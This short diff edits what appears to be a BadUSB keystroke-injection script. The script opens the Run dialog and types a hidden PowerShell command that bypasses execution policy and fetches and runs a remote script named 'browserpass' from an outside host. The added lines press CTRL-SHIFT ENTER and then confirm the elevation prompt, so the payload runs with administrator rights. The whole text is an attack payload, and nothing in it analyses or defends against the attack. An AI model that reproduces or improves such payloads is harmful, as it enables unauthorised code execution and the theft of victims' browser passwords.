@@ -10,4 +10,8 @@ GUI r
 DELAY 500
 STRING cmd /c start /min "" powershell -w h -NoP -Ep Bypass -Command "$dc='';$db='';irm badusb.39039820.xyz/browserpass | iex"
 DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1500
+LEFT
+DELAY 250
 ENTER
